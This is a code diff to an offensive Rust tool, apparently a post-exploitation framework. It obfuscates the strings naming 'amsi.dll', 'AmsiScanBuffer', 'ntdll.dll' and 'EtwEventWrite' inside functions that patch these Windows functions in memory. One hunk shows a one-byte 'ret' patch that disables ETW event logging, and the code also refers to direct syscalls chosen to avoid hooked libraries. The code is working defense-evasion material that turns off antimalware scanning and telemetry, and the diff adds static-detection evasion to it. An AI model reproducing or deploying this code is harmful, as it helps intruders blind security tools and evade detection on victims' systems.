@@ -119,7 +119,10 @@ pub unsafe fn patch_amsi() -> Result<AmsiBypassResult> {
     unsafe {
         use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 
-        let amsi = GetModuleHandleA(windows::core::s!("amsi.dll")).ok();
+        let amsi = GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("amsi.dll").as_bytes().as_ptr(),
+        ))
+        .ok();
         let Some(amsi) = amsi else {
             info!("AMSI bypass: amsi.dll not loaded, skipping");
             return Ok(AmsiBypassResult {
@@ -130,7 +133,10 @@ pub unsafe fn patch_amsi() -> Result<AmsiBypassResult> {
             });
         };
 
-        let target = GetProcAddress(amsi, windows::core::s!("AmsiScanBuffer"));
+        let target = GetProcAddress(
+            amsi,
+            windows::core::PCSTR(crate::xs!("AmsiScanBuffer").as_bytes().as_ptr()),
+        );
         let Some(target) = target else {
             return Err(OverthroneError::PostExploitation(
                 "AMSI bypass: AmsiScanBuffer symbol not found".into(),
@@ -183,14 +189,20 @@ pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
     unsafe {
         use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 
-        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll")).ok();
+        let ntdll = GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+        ))
+        .ok();
         let Some(ntdll) = ntdll else {
             return Err(OverthroneError::PostExploitation(
                 "ETW suppress: ntdll.dll not loaded".into(),
             ));
         };
 
-        let target = GetProcAddress(ntdll, windows::core::s!("EtwEventWrite"));
+        let target = GetProcAddress(
+            ntdll,
+            windows::core::PCSTR(crate::xs!("EtwEventWrite").as_bytes().as_ptr()),
+        );
         let Some(target) = target else {
             return Err(OverthroneError::PostExploitation(
                 "ETW suppress: EtwEventWrite symbol not found".into(),
@@ -245,7 +257,10 @@ pub unsafe fn patch_amsi_direct(numbers: &SyscallNumbers) -> Result<AmsiBypassRe
         // Use GetModuleHandleA from kernel32 (less likely to be hooked than ntdll)
         use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 
-        let amsi = GetModuleHandleA(windows::core::s!("amsi.dll")).ok();
+        let amsi = GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("amsi.dll").as_bytes().as_ptr(),
+        ))
+        .ok();
         let Some(amsi) = amsi else {
             tracing::info!("AMSI direct: amsi.dll not loaded, skipping");
             return Ok(AmsiBypassResult {
@@ -256,7 +271,10 @@ pub unsafe fn patch_amsi_direct(numbers: &SyscallNumbers) -> Result<AmsiBypassRe
             });
         };
 
-        let target = GetProcAddress(amsi, windows::core::s!("AmsiScanBuffer"));
+        let target = GetProcAddress(
+            amsi,
+            windows::core::PCSTR(crate::xs!("AmsiScanBuffer").as_bytes().as_ptr()),
+        );
         let Some(target) = target else {
             return Err(OverthroneError::PostExploitation(
                 "AMSI direct: AmsiScanBuffer symbol not found".into(),
@@ -373,18 +391,21 @@ pub unsafe fn suppress_etw_direct(numbers: &SyscallNumbers) -> Result<EtwSuppres
     unsafe {
         use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
 
-        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll"))
-            .ok()
-            .ok_or_else(|| {
-                OverthroneError::PostExploitation("ETW direct: ntdll.dll not loaded".into())
-            })?;
+        let ntdll = GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+        ))
+        .ok()
+        .ok_or_else(|| {
+            OverthroneError::PostExploitation("ETW direct: ntdll.dll not loaded".into())
+        })?;
 
-        let target =
-            GetProcAddress(ntdll, windows::core::s!("EtwEventWrite")).ok_or_else(|| {
-                OverthroneError::PostExploitation(
-                    "ETW direct: EtwEventWrite symbol not found".into(),
-                )
-            })?;
+        let target = GetProcAddress(
+            ntdll,
+            windows::core::PCSTR(crate::xs!("EtwEventWrite").as_bytes().as_ptr()),
+        )
+        .ok_or_else(|| {
+            OverthroneError::PostExploitation("ETW direct: EtwEventWrite symbol not found".into())
+        })?;
 
         // Patch: ret (1 byte: 0xC3)
         let patch: [u8; 1] = [0xC3];
@@ -570,9 +591,11 @@ pub fn resolve_syscall_numbers() -> Result<std::collections::HashMap<String, u32
     unsafe {
         use windows::Win32::System::LibraryLoader::GetModuleHandleA;
 
-        let ntdll = GetModuleHandleA(windows::core::s!("ntdll.dll"))
-            .ok()
-            .ok_or_else(|| OverthroneError::PostExploitation("ntdll.dll not loaded".into()))?;
+        let ntdll = GetModuleHandleA(windows::core::PCSTR(
+            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
+        ))
+        .ok()
+        .ok_or_else(|| OverthroneError::PostExploitation("ntdll.dll not loaded".into()))?;
 
         let ntdll_base = ntdll.0 as usize;
 
